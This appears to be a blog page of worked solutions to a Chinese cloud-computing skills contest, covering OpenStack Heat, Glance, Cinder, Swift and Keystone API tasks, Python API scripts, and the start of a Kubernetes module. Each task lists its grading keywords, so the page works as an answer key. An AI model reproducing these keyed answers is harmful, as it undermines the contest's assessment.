<p>将openstack stack list命令的返回结果提交到答题框。【1分】</p>
<p><strong>标准: Stack&amp;&amp;Status&amp;&amp;CREATE_COMPLETE</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# cat create_flavor.yaml</span><br><span class="line">heat_template_version: 2018-08-31</span><br><span class="line">description: Generated template</span><br><span class="line">resources:</span><br><span class="line">  nova_flavor:</span><br><span class="line">    type: OS::Nova::Flavor</span><br><span class="line">    properties:</span><br><span class="line">      name: m2.flavor</span><br><span class="line">      disk: 20</span><br><span class="line">      is_public: True</span><br><span class="line">      ram: 1024</span><br><span class="line">      vcpus: 1</span><br><span class="line">      flavorid: 1234</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行heat模板</span></span><br><span class="line">[root@controller ~]# openstack stack create -t create_flavor.yaml test</span><br><span class="line">+---------------------+--------------------------------------+</span><br><span class="line">| Field               | Value                                |</span><br><span class="line">+---------------------+--------------------------------------+</span><br><span class="line">| id                  | ffd515d5-9d06-4ead-872e-e698ceb77959 |</span><br><span class="line">| stack_name          | test                                 |</span><br><span class="line">| description         | Generated template                   |</span><br><span class="line">| creation_time       | 2023-02-27T10:19:40Z                 |</span><br><span class="line">| updated_time        | None                                 |</span><br><span class="line">| stack_status        | CREATE_IN_PROGRESS                   |</span><br><span class="line">| stack_status_reason | Stack CREATE started                 |</span><br><span class="line">+---------------------+--------------------------------------+.</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看列表</span></span><br><span class="line">[root@controller ~]# openstack stack list</span><br><span class="line">+--------------------------------------+------------+----------------------------------+----------------+----------------------+--------------+</span><br><span class="line">| ID                                   | Stack Name | Project                          | Stack Status   | Creation Time        | Updated Time |</span><br><span class="line">+--------------------------------------+------------+----------------------------------+----------------+----------------------+--------------+</span><br><span class="line">| ffd515d5-9d06-4ead-872e-e698ceb77959 | test       | ce21284fd468495995218ea6e1aeea2a | CHECK_COMPLETE | 2023-02-27T10:19:40Z | None         |</span><br></pre></td></tr></table></figure>

<h3 id="7-后端配置文件管理"><a href="#7-后端配置文件管理" class="headerlink" title="7.后端配置文件管理"></a>7.后端配置文件管理</h3><p>修改glance后端配置文件，将项目的映像存储限制为10GB,完成后重启glance服务。</p>
<p>将cat &#x2F;etc&#x2F;glance&#x2F;glance-api.conf |grep _quota命令的返回结果提交到答题框。【1分】</p>
<p><strong>标准: user_storage_quota&amp;&amp;10737418240</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# vim /etc/glance/glance-api.conf</span><br><span class="line">user_storage_quota = 10737418240</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启</span></span><br><span class="line">[root@controller ~]# systemctl restart openstack-glance-*</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查询</span></span><br><span class="line">[root@controller ~]# cat /etc/glance/glance-api.conf |grep _quota</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">``image_property_quota`` configuration option.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">     * image_property_quota</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">image_member_quota = 128</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">image_property_quota = 128</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">image_tag_quota = 128</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">image_location_quota = 10</span></span><br><span class="line">user_storage_quota = 10737418240</span><br></pre></td></tr></table></figure>

<h3 id="8-存储服务管理"><a href="#8-存储服务管理" class="headerlink" title="8.存储服务管理"></a>8.存储服务管理</h3><p>在controller节点执行openstack-controller-cinder.sh,compute节点执行openstack-compute-cinder.sh，在controller和compute节点上会自行安装cinder服务并完成配置。使用openstack命令创建一个名为lvm的卷类型，使用cinder命令创建该类型规格键值对，要求lvm卷类型对应cinder后端驱动lvm所管理的存储资源,名字lvm_test，大小1G的云硬盘并查询该云硬盘的详细信息。</p>
<p>将cinder show lvm_test命令的返回结果提交到答题框。【1分】</p>
<p><strong>标准: name&amp;&amp;lvm_test&amp;&amp;size&amp;&amp;1&amp;&amp;volume_type&amp;&amp;lvm</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack-controller-cinder.sh </span><br><span class="line">[root@compute ~]# openstack-compute-cinder.sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建卷类型lvm</span></span><br><span class="line">[root@controller ~]# source admin-openrc</span><br><span class="line">[root@controller ~]# openstack volume type create lvm</span><br><span class="line">+-------------+--------------------------------------+</span><br><span class="line">| Field       | Value                                |</span><br><span class="line">+-------------+--------------------------------------+</span><br><span class="line">| description | None                                 |</span><br><span class="line">| id          | 5a1ac113-b226-4646-9a7c-46eee3f6346f |</span><br><span class="line">| is_public   | True                                 |</span><br><span class="line">| name        | lvm                                  |</span><br><span class="line">+-------------+--------------------------------------+</span><br><span class="line">[root@controller ~]# cinder type-key lvm set volume_backend_name=LVM</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建云硬盘</span></span><br><span class="line">[root@controller ~]# cinder create --volume-type lvm --name lvm_test 1</span><br><span class="line">略                                               </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看详细信息</span></span><br><span class="line">[root@controller ~]# cinder show lvm_test</span><br><span class="line">+--------------------------------+--------------------------------------+</span><br><span class="line">| Property                       | Value                                |</span><br><span class="line">+--------------------------------+--------------------------------------+</span><br><span class="line">| attached_servers               | []                                   |</span><br><span class="line">| attachment_ids                 | []                                   |</span><br><span class="line">| availability_zone              | nova                                 |</span><br><span class="line">| bootable                       | false                                |</span><br><span class="line">| consistencygroup_id            | None                                 |</span><br><span class="line">| created_at                     | 2022-10-25T12:28:55.000000           |</span><br><span class="line">| description                    | None                                 |</span><br><span class="line">| encrypted                      | False                                |</span><br><span class="line">| id                             | 39f131c3-6ee2-432a-8096-e13173307339 |</span><br><span class="line">| metadata                       |                                      |</span><br><span class="line">| migration_status               | None                                 |</span><br><span class="line">| multiattach                    | False                                |</span><br><span class="line">| name                           | lvm_test                             |</span><br><span class="line">| os-vol-host-attr:host          | compute@lvm#LVM                      |</span><br><span class="line">| os-vol-mig-status-attr:migstat | None                                 |</span><br><span class="line">| os-vol-mig-status-attr:name_id | None                                 |</span><br><span class="line">| os-vol-tenant-attr:tenant_id   | 4885b78813a5466d9d6d483026f2067c     |</span><br><span class="line">| replication_status             | None                                 |</span><br><span class="line">| size                           | 1                                    |</span><br><span class="line">| snapshot_id                    | None                                 |</span><br><span class="line">| source_volid                   | None                                 |</span><br><span class="line">| status                         | available                            |</span><br><span class="line">| updated_at                     | 2022-10-25T12:28:56.000000           |</span><br><span class="line">| user_id                        | b4a6c1eb18c247edba11b57be18ec752     |</span><br><span class="line">| volume_type                    | lvm                                  |</span><br></pre></td></tr></table></figure>

<h3 id="9-存储管理"><a href="#9-存储管理" class="headerlink" title="9.存储管理"></a>9.存储管理</h3><p>为了减缓来自实例的数据访问速度的变慢，OpenStack Block Storage 支持对卷数据复制带宽的速率限制。请修改cinder后端配置文件将卷复制带宽限制为最高100MiB&#x2F;s（对应数值修改为104857600）。</p>
<p>将cat &#x2F;etc&#x2F;cinder&#x2F;cinder.conf | grep 104857600命令的返回结果提交到答题框。【1分】</p>
<p><strong>标准: volume_copy_bps_limit&amp;&amp;104857600</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# vim /etc/cinder/cinder.conf</span><br><span class="line">[lvmdriver-1]</span><br><span class="line">volume_group=cinder-volumes-1</span><br><span class="line">volume_driver=cinder.volume.drivers.lvm.LVMVolumeDriver</span><br><span class="line">volume_backend_name=LVM</span><br><span class="line">volume_copy_bps_limit=104857600</span><br><span class="line">[root@controller ~]# systemctl restart openstack-cinder-*</span><br><span class="line">[root@controller ~]# cat /etc/cinder/cinder.conf | grep 104857600</span><br><span class="line">volume_copy_bps_limit=104857600</span><br></pre></td></tr></table></figure>

<h3 id="10-存储管理"><a href="#10-存储管理" class="headerlink" title="10.存储管理"></a>10.存储管理</h3><p>在controller节点执行openstack-controller-swift.sh,compute节点执行openstack-compute-swift.sh，在controller和compute节点上会自行安装swift服务并完成配置。使用swift命令创建一个名为file的容器并查看，然后把cirros-0.3.4-x86_64-disk.img上传到file容器中。</p>
<p>将swift stat file命令的返回结果提交到答题框。【1分】</p>
<p><strong>标准: Container&amp;&amp;file&amp;&amp;Objects&amp;&amp;1&amp;&amp;Bytes&amp;&amp;13287936</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# openstack-controller-swift.sh</span><br><span class="line">[root@compute ~]# openstack-compute-swift.sh</span><br><span class="line">[root@controller ~]# swift post file</span><br><span class="line">[root@controller ~]# swift upload file /root/cirros-0.3.4-x86_64-disk.img</span><br><span class="line">root/cirros-0.3.4-x86_64-disk.img</span><br><span class="line">[root@controller ~]# swift stat file</span><br><span class="line">               Account: AUTH_d23ad8b534f44b02ad30c9f7847267df</span><br><span class="line">             Container: file</span><br><span class="line">               Objects: 1</span><br><span class="line">                 Bytes: 13287936</span><br><span class="line">              Read ACL:</span><br><span class="line">             Write ACL:</span><br><span class="line">               Sync To:</span><br><span class="line">              Sync Key:</span><br><span class="line">         Accept-Ranges: bytes</span><br><span class="line">      X-Storage-Policy: Policy-0</span><br><span class="line">         Last-Modified: Fri, 10 Mar 2023 02:43:07 GMT</span><br><span class="line">           X-Timestamp: 1678416180.44884</span><br><span class="line">            X-Trans-Id: txfdc2fb777c4641d3a9292-00640a9941</span><br><span class="line">          Content-Type: application/json; charset=utf-8</span><br><span class="line">X-Openstack-Request-Id: txfdc2fb777c4641d3a9292-00640a9941</span><br></pre></td></tr></table></figure>

<h3 id="11-OpenStack-API-管理"><a href="#11-OpenStack-API-管理" class="headerlink" title="11.OpenStack API 管理"></a>11.OpenStack API 管理</h3><p>使用curl的方式获取admin用户token值；使用已获取的token值通过curl的方式获取domain为default所有用户名（ip使用主机名）。</p>
<p>将获取到的所有用户名提交到答题框。【1分】</p>
<p><strong>标准: admin&amp;&amp;myuser&amp;&amp;tom&amp;&amp;glance&amp;&amp;nova&amp;&amp;placement&amp;&amp;neutron&amp;&amp;heat&amp;&amp;cinder&amp;&amp;swift</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# curl -i -X POST http://controller:5000/v3/auth/tokens -H &quot;Content-type: application/json&quot; -d &#x27;&#123;&quot;auth&quot;: &#123;&quot;identity&quot;: &#123;&quot;methods&quot;:[&quot;password&quot;],&quot;password&quot;: &#123;&quot;user&quot;: &#123;&quot;domain&quot;: &#123;&quot;name&quot;: &quot;default&quot;&#125;,&quot;name&quot;: &quot;admin&quot;,&quot;password&quot;: &quot;000000&quot;&#125;&#125;&#125;,&quot;scope&quot;: &#123;&quot;project&quot;: &#123;&quot;domain&quot;: &#123;&quot;name&quot;: &quot;default&quot;&#125;,&quot;name&quot;: &quot;admin&quot;&#125;&#125;&#125;&#125;&#x27; | grep X-Subject-Token</span><br><span class="line"><span class="meta prompt_">  % </span><span class="language-bash">Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span></span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  6821  100  6612  100   209  21381    675 --:--:-- --:--:-- --:--:-- 21398</span><br><span class="line">X-Subject-Token: gAAAAABkB9xoMQZNnMcPh_gB4T0Pmo4TUO1ezwBZtFSjAR68fUOppadNTTCpcOGjMpN3al9FM8MHma9FCSoWxQHSuG9vbxOxkELeKBqF_I2_uzmouvxGQ7a35oJ5IvGwNp4hap5doeXt-2dG5LvPyqxW7hndEAQDjuTKbnqVlwHbjXVpT4zoYuc</span><br><span class="line">[root@controller ~]# curl http://controller:5000/v3/users?domain_id=default -H &quot;X-Auth-Token: gAAAAABkB9xoMQZNnMcPh_gB4T0Pmo4TUO1ezwBZtFSjAR68fUOppadNTTCpcOGjMpN3al9FM8MHma9FCSoWxQHSuG9vbxOxkELeKBqF_I2_uzmouvxGQ7a35oJ5IvGwNp4hap5doeXt-2dG5LvPyqxW7hndEAQDjuTKbnqVlwHbjXVpT4zoYuc&quot; | python -m json.tool | grep name</span><br><span class="line"><span class="meta prompt_">  % </span><span class="language-bash">Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span></span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  2479  100  2479    0     0  22848      0 --:--:-- --:--:-- --:--:-- 22953</span><br><span class="line">            &quot;name&quot;: &quot;admin&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;myuser&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;tom&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;glance&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;nova&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;placement&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;neutron&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;cinder&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;swift&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;heat&quot;,</span><br></pre></td></tr></table></figure>

<h2 id="任务四-OpenStack架构任务（6分）"><a href="#任务四-OpenStack架构任务（6分）" class="headerlink" title="任务四 OpenStack架构任务（6分）"></a>任务四 OpenStack架构任务（6分）</h2><h3 id="1-安装python3环境"><a href="#1-安装python3环境" class="headerlink" title="1.安装python3环境"></a>1.安装python3环境</h3><p>在controller节点安装python3环境。安装完之后查看python3版本，使用提供的whl文件安装依赖。</p>
<p>将pip3 list命令的返回结果提交到答题框。【2分】</p>
<p><strong>标准: certifi&amp;&amp;2019.11.28&amp;&amp;pip&amp;&amp;9.0.3&amp;&amp;urllib3&amp;&amp;1.25.11&amp;&amp;setuptools&amp;&amp;39.2.0</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller python-depend]# yum install python3 –y</span><br><span class="line">[root@controller python-depend]# pip3 install certifi-2019.11.28-py2.py3-none-any.whl</span><br><span class="line">[root@controller python-depend]# pip3 install urllib3-1.25.11-py3-none-any.whl</span><br><span class="line">[root@controller python-depend]# pip3 install idna-2.8-py2.py3-none-any.whl</span><br><span class="line">[root@controller python-depend]# pip3 install chardet-3.0.4-py2.py3-none-any.whl</span><br><span class="line">[root@controller python-depend]# pip3 install requests-2.24.0-py2.py3-none-any.whl</span><br><span class="line">[root@controller ~]# python3 --version</span><br><span class="line">Python 3.6.8</span><br><span class="line">[root@controller ~]# pip3 list</span><br><span class="line">DEPRECATION: The default format will switch to columns in the future. You can use --format=(legacy|columns) (or define a format=(legacy|columns) in your pip.conf under the [list] section) to disable this warning.</span><br><span class="line">certifi (2019.11.28)</span><br><span class="line">chardet (3.0.4)</span><br><span class="line">idna (2.8)</span><br><span class="line">pip (9.0.3)</span><br><span class="line">requests (2.24.0)</span><br><span class="line">setuptools (39.2.0)</span><br><span class="line">urllib3 (1.25.11)</span><br></pre></td></tr></table></figure>

<h3 id="2-python对接OpenStack-API创建image镜像"><a href="#2-python对接OpenStack-API创建image镜像" class="headerlink" title="2.python对接OpenStack API创建image镜像"></a>2.python对接OpenStack API创建image镜像</h3><p>编写python代码对接OpenStack API，完成镜像的上传。在controller节点的&#x2F;root目录下创建create_image.py文件，在该文件中编写python代码对接openstack api（需在py文件中获取token），要求在openstack私有云平台中上传镜像cirros-0.3.4-x86_64-disk.img，名字为cirros001，disk_format为qcow2，container_format为bare。执行完代码要求输出“创建镜像成功，id为：xxxxxx”。</p>
<p>分别将cat &#x2F;root&#x2F;create_image.py命令和python3 create_image.py命令的返回结果提交到答题框。【2分】</p>
<p><strong>标准: import&amp;&amp;requests&amp;&amp;:5000&#x2F;v3&#x2F;auth&#x2F;tokens&amp;&amp;:9292&#x2F;v2&#x2F;images&amp;&amp;password&amp;&amp;admin&amp;&amp;000000&amp;&amp;X-Auth-Token&amp;&amp;container_format&amp;&amp;bare&amp;&amp;disk_format&amp;&amp;qcow2&amp;&amp;&#x2F;file&amp;&amp;cirros-0.3.4-x86_64-disk.img&amp;&amp;application</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller python3]# python3 create_image.py</span><br><span class="line">请输入访问openstack平台控制节点IP地址：（xx.xx.xx.xx)</span><br><span class="line">192.168.100.x</span><br><span class="line">创建镜像成功，id为：0591f693-a7c7-4e7f-ac6c-957b7bccffc9</span><br><span class="line">镜像文件上传成功</span><br><span class="line">[root@controller ~]# cat create_image.py</span><br><span class="line">import requests,json,time</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">*******************全局变量IP*****************************</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行代码前，请修改controller_ip的IP地址，与指定router，IP可以input，也可以写成静态</span></span><br><span class="line">controller_ip = input(&quot;请输入访问openstack平台控制节点IP地址：（xx.xx.xx.xx)\n&quot;)</span><br><span class="line"></span><br><span class="line">image_name = &quot;cirros001&quot;</span><br><span class="line">file_path = &quot;/root/cirros-0.3.4-x86_64-disk.img&quot;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    url  = f&quot;http://&#123;controller_ip&#125;:5000/v3/auth/tokens&quot;</span><br><span class="line">    body = &#123;</span><br><span class="line">       &quot;auth&quot;: &#123;</span><br><span class="line">           &quot;identity&quot;: &#123;</span><br><span class="line">              &quot;methods&quot;:[&quot;password&quot;],</span><br><span class="line">              &quot;password&quot;: &#123;</span><br><span class="line">                  &quot;user&quot;: &#123;</span><br><span class="line">                     &quot;domain&quot;:&#123;</span><br><span class="line">                         &quot;name&quot;: &quot;Default&quot;</span><br><span class="line">                     &#125;,</span><br><span class="line">                     &quot;name&quot;: &quot;admin&quot;,</span><br><span class="line">                     &quot;password&quot;: &quot;000000&quot;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">           &#125;,</span><br><span class="line">           &quot;scope&quot;: &#123;</span><br><span class="line">              &quot;project&quot;: &#123;</span><br><span class="line">                  &quot;domain&quot;: &#123;</span><br><span class="line">                     &quot;name&quot;: &quot;Default&quot;</span><br><span class="line">                  &#125;,</span><br><span class="line">                  &quot;name&quot;: &quot;admin&quot;</span><br><span class="line">              &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;</span><br><span class="line">    Token = requests.post(url, data=json.dumps(body), headers=headers).headers[&#x27;X-Subject-Token&#x27;]</span><br><span class="line">    headers = &#123;&quot;X-Auth-Token&quot;: Token&#125;</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(f&quot;获取Token值失败，请检查访问云主机控制节点IP是否正确？输出错误信息如下：&#123;str(e)&#125;&quot;)</span><br><span class="line">    exit(0)</span><br><span class="line"></span><br><span class="line">class glance_api:</span><br><span class="line">    def __init__(self, headers: dict, resUrl: str):</span><br><span class="line">       self.headers = headers</span><br><span class="line">       self.resUrl = resUrl</span><br><span class="line">    #创建glance镜像</span><br><span class="line">    def create_glance(self, container_format=&quot;bare&quot;, disk_format=&quot;qcow2&quot;):</span><br><span class="line">       body = &#123;</span><br><span class="line">           &quot;container_format&quot;: container_format,</span><br><span class="line">           &quot;disk_format&quot;: disk_format,</span><br><span class="line">           &quot;name&quot;: image_name,</span><br><span class="line">        &#125;</span><br><span class="line">       status_code = requests.post(self.resUrl, data=json.dumps(body), headers=self.headers).status_code</span><br><span class="line">       if(status_code == 201):</span><br><span class="line">           return f&quot;创建镜像成功，id为：&#123;glance_api.get_glance_id()&#125;&quot;</span><br><span class="line">       else:</span><br><span class="line">           return &quot;创建镜像失败&quot;</span><br><span class="line">    #获取glance镜像id</span><br><span class="line">    def get_glance_id(self):</span><br><span class="line">       result = json.loads(requests.get(self.resUrl,headers=self.headers).text)</span><br><span class="line">       for item in result[&#x27;images&#x27;]:</span><br><span class="line">           if(item[&#x27;name&#x27;] == image_name):</span><br><span class="line">              return item[&#x27;id&#x27;]</span><br><span class="line">    #上传glance镜像</span><br><span class="line">    def update_glance(self):</span><br><span class="line">       self.resUrl=self.resUrl+&quot;/&quot;+self.get_glance_id()+&quot;/file&quot;</span><br><span class="line">       self.headers[&#x27;Content-Type&#x27;] = &quot;application/octet-stream&quot;</span><br><span class="line">       status_code = requests.put(self.resUrl,data=open(file_path,&#x27;rb&#x27;).read(),headers=self.headers).status_code</span><br><span class="line">       if(status_code == 204):</span><br><span class="line">           return &quot;镜像文件上传成功&quot;</span><br><span class="line">       else:</span><br><span class="line">           return &quot;镜像文件上传失败&quot;</span><br><span class="line">glance_api = glance_api(headers,f&quot;http://&#123;controller_ip&#125;:9292/v2/images&quot;)</span><br><span class="line">print(glance_api.create_glance())  #调用glance-api中创建镜像方法</span><br><span class="line">print(glance_api.update_glance())</span><br></pre></td></tr></table></figure>

<h3 id="3-python对接OpenStack-API创建用户"><a href="#3-python对接OpenStack-API创建用户" class="headerlink" title="3.python对接OpenStack API创建用户"></a>3.python对接OpenStack API创建用户</h3><p>编写python代码对接OpenStack API，完成用户的创建。在controller节点的&#x2F;root目录下创建create_user.py文件，在该文件中编写python代码对接openstack api（需在py文件中获取token），要求在openstack私有云平台中创建用户guojibeisheng。</p>
<p>将cat &#x2F;root&#x2F;create_user.py命令的返回结果提交到答题框。【2分】</p>
<p><strong>标准: import&amp;&amp;requests&amp;&amp;:5000&#x2F;v3&#x2F;auth&#x2F;tokens&amp;&amp;:5000&#x2F;v3&#x2F;users&amp;&amp;password&amp;&amp;admin&amp;&amp;000000&amp;&amp;X-Auth-Token&amp;&amp;domain_id&amp;&amp;name&amp;&amp;application&amp;&amp;:5000&#x2F;v3&#x2F;users</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller python3]# python3 create_user.py</span><br><span class="line">请输入访问openstack平台控制节点IP地址：（xx.xx.xx.xx)</span><br><span class="line">192.168.100.x</span><br><span class="line">用户 guojibeisheng 创建成功,ID为dcb0fc7bacf54038b624463921123aed</span><br><span class="line">该平台的用户为：</span><br><span class="line">guojibeisheng</span><br><span class="line">admin</span><br><span class="line">myuser</span><br><span class="line">tom</span><br><span class="line">glance</span><br><span class="line">nova</span><br><span class="line">placement</span><br><span class="line">neutron</span><br><span class="line">heat</span><br><span class="line">heat_domain_admin</span><br><span class="line">cinder</span><br><span class="line">swift</span><br><span class="line">用户 guojibeisheng 已删除！</span><br><span class="line">[root@controller python3]# cat create_user.py</span><br><span class="line">import requests,json,time</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">*******************全局变量IP*****************************</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行代码前，请修改controller_ip的IP地址，与指定router，IP可以input，也可以写成静态</span></span><br><span class="line">controller_ip = input(&quot;请输入访问openstack平台控制节点IP地址：（xx.xx.xx.xx)\n&quot;)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    url  = f&quot;http://&#123;controller_ip&#125;:5000/v3/auth/tokens&quot;</span><br><span class="line">    body = &#123;</span><br><span class="line">       &quot;auth&quot;: &#123;</span><br><span class="line">           &quot;identity&quot;: &#123;</span><br><span class="line">              &quot;methods&quot;:[&quot;password&quot;],</span><br><span class="line">              &quot;password&quot;: &#123;</span><br><span class="line">                  &quot;user&quot;: &#123;</span><br><span class="line">                     &quot;domain&quot;:&#123;</span><br><span class="line">                         &quot;name&quot;: &quot;Default&quot;</span><br><span class="line">                     &#125;,</span><br><span class="line">                      &quot;name&quot;: &quot;admin&quot;,</span><br><span class="line">                     &quot;password&quot;: &quot;000000&quot;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">           &#125;,</span><br><span class="line">           &quot;scope&quot;: &#123;</span><br><span class="line">              &quot;project&quot;: &#123;</span><br><span class="line">                  &quot;domain&quot;: &#123;</span><br><span class="line">                     &quot;name&quot;: &quot;Default&quot;</span><br><span class="line">                  &#125;,</span><br><span class="line">                  &quot;name&quot;: &quot;admin&quot;</span><br><span class="line">              &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;</span><br><span class="line">    Token = requests.post(url, data=json.dumps(body), headers=headers).headers[&#x27;X-Subject-Token&#x27;]</span><br><span class="line">    headers = &#123;&quot;X-Auth-Token&quot;: Token&#125;</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(f&quot;获取Token值失败，请检查访问云主机控制节点IP是否正确？输出错误信息如下：&#123;str(e)&#125;&quot;)</span><br><span class="line">    exit(0)</span><br><span class="line"></span><br><span class="line">class openstack_user_api:</span><br><span class="line">    def __init__(self, handers: dict, resUrl: str):</span><br><span class="line">        self.headers = handers</span><br><span class="line">        self.resUrl = resUrl</span><br><span class="line">    def create_users(self, user_name):</span><br><span class="line">        body = &#123;</span><br><span class="line">            &quot;user&quot;: &#123;</span><br><span class="line">                &quot;description&quot;: &quot;API create user!&quot;,</span><br><span class="line">                &quot;domain_id&quot;: &quot;default&quot;,</span><br><span class="line">                &quot;name&quot;: user_name</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        status_code = requests.post(self.resUrl, data=json.dumps(body), headers=self.headers).text</span><br><span class="line">        result = json.loads(requests.get(self.resUrl, headers=self.headers).text)</span><br><span class="line">        user_name = user_name</span><br><span class="line">        for i in result[&#x27;users&#x27;]:</span><br><span class="line">            if i[&#x27;name&#x27;] == user_name:</span><br><span class="line">                return f&quot;用户 &#123;user_name&#125; 创建成功,ID为&#123;i[&#x27;id&#x27;]&#125;&quot;</span><br><span class="line">    def list_users(self):</span><br><span class="line">        result = json.loads(requests.get(self.resUrl, headers=self.headers).text)</span><br><span class="line">        roles = []</span><br><span class="line">        for i in result[&#x27;users&#x27;]:</span><br><span class="line">            if i[&#x27;name&#x27;] not in roles:</span><br><span class="line">                roles.append(i[&#x27;name&#x27;])</span><br><span class="line">        return &quot;该平台的用户为：\n&quot;+&#x27;\n&#x27;.join(roles)</span><br><span class="line"></span><br><span class="line">    def get_user_id(self, user_name):</span><br><span class="line">        result = json.loads(requests.get(self.resUrl, headers=self.headers).text)</span><br><span class="line">        user_name = user_name</span><br><span class="line">        for i in result[&#x27;users&#x27;]:</span><br><span class="line">            if i[&#x27;name&#x27;] == user_name:</span><br><span class="line">                return (f&quot;用户 &#123;user_name&#125; 的ID为&#123;i[&#x27;id&#x27;]&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    def delete_user(self, user_name):</span><br><span class="line">        result = json.loads(requests.get(self.resUrl, headers=self.headers).text)</span><br><span class="line">        for i in result[&#x27;users&#x27;]:</span><br><span class="line">            if i[&#x27;name&#x27;] == user_name:</span><br><span class="line">                i = i[&#x27;id&#x27;]</span><br><span class="line">                status_code = requests.delete(f&#x27;http://&#123;controller_ip&#125;:5000/v3/users/&#123;i&#125;&#x27;, headers=self.headers)</span><br><span class="line">                return f&quot;用户 &#123;user_name&#125; 已删除！&quot;</span><br><span class="line"></span><br><span class="line">openstack_user_api = openstack_user_api(headers, f&quot;http://&#123;controller_ip&#125;:5000/v3/users&quot;)</span><br><span class="line"></span><br><span class="line">print(openstack_user_api.create_users(&quot;guojibeisheng&quot;))</span><br><span class="line">print(openstack_user_api.list_users())</span><br><span class="line">print(openstack_user_api.delete_user(&quot;guojibeisheng&quot;))</span><br></pre></td></tr></table></figure>

<h1 id="B模块题目：容器的编排与运维"><a href="#B模块题目：容器的编排与运维" class="headerlink" title="B模块题目：容器的编排与运维"></a>B模块题目：容器的编排与运维</h1><p>某企业计划使用k8s平台搭建微服务系统，现在先使用简单的微服务项目进行测试，请按照要求完成相应任务。</p>
<p>表1 IP地址规划</p>
<table>
<thead>
<tr>
<th>设备名称</th>
<th>主机名</th>
<th>接口</th>
<th>IP地址</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>云服务器1</td>
<td>master</td>
<td>eth0</td>
<td>公网IP:*******<em>私网IP:192.168.100.</em>&#x2F;24</td>
<td>Harbor也是使用该云服务器</td>
</tr>
<tr>
<td>云服务器2</td>
<td>node</td>
<td>eth0</td>
<td>公网IP:*******<em>私网IP:192.168.100.</em>&#x2F;24</td>
<td></td>
</tr>
</tbody></table>
<p>说明：</p>
<p>1.表1中的公网IP和私网IP以自己云主机显示为准，每个人的公网IP和私网IP不同。使用第三方软件远程连接云主机，使用公网IP连接。</p>
<p>2.华为云中云主机名字已命好，直接使用对应名字的云主机即可。</p>
<p> 3.竞赛用到的软件包都在云主机&#x2F;root下。</p>
<h2 id="任务-1容器云平台环境初始化（10-5分）"><a href="#任务-1容器云平台环境初始化（10-5分）" class="headerlink" title="任务 1容器云平台环境初始化（10.5分）"></a>任务 1容器云平台环境初始化（10.5分）</h2><h3 id="1-容器云平台的初始化"><a href="#1-容器云平台的初始化" class="headerlink" title="1.容器云平台的初始化"></a>1.容器云平台的初始化</h3><p>master节点主机名设置为master、node节点主机名设置为node，所有节点root密码设置为000000,所有节点关闭swap，并配置hosts映射。</p>
<p>请在master节点将ping node -c 3命令的返回结果提交到答题框。【1.5分】</p>
<p><strong>标准: icmp_seq&amp;&amp;0%</strong></p>
